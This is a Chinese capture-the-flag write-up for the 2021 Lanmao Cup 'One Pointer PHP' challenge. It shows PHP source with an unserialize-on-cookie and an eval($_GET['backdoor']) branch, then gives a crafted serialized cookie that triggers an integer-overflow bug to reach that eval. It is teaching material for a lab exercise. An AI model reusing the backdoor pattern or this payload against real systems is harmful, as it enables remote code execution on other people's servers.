# \[蓝帽杯 2021]One Pointer PHP

## \[蓝帽杯 2021]One Pointer PHP

## 考点

## wp

给了源码，代码比较少，`user.php`定义了`User`类，有一个`count`属性

`add_api.php`先对`cookie`中的`data`进行反序列化，然后把反序列化后`User`类的`count`属性加一赋值给`count`数组，作为key，对应的value为`1`。`$count[]=1`是对数组的最后一个元素赋值，然后反序列化的`User`类的`count`属性再加一

```php
include "user.php";
if($user=unserialize($_COOKIE["data"])){
	$count[++$user->count]=1;
	if($count[]=1){
		$user->count+=1;
		setcookie("data",serialize($user));
	}else{
		eval($_GET["backdoor"]);
	}
}else{
	$user=new User;
	$user->count=1;
	setcookie("data",serialize($user));
}
```

举个例子，如果这里反序列化的是`O:4:"User":1:{s:5:"count";i:1;}`

那么反序列化后的user是`object(User)#1 (1) { ["count"]=> int(1) }`

然后执行数组赋值`$count[++$user->count]=1`，此时的user是`object(User)#1 (1) { ["count"]=> int(2) }`

count数组是`array(1) { [2]=> int(1) }`，意思是第3个元素值为1

然后执行`$count[]=1`，对后面一个元素赋值，count数组变成了`array(2) { [2]=> int(1) [3]=> int(1) }`，第3个和第4个元素值为1

这样就会有一个**溢出**的问题，在执行`$count[]=1`前，如果count数组的下标达到了整型最大，就会在执行这个语句时发生溢出。

回到题目，题目给的cookie如下

```
O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A1%3B%7D
```

32位系统int最大取值为2147483647，64位的最大取值为9223372036854775807。由于中间有一次count的自增，所以改成9223372036854775806，就可以执行shell

```
O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D
```

![](<../../.gitbook/assets/image (26).png>)

disable\_functions过滤了很多东西，并且设置了`open_basedir`是`/var/www/html`

![](<../../.gitbook/assets/image (11).png>)

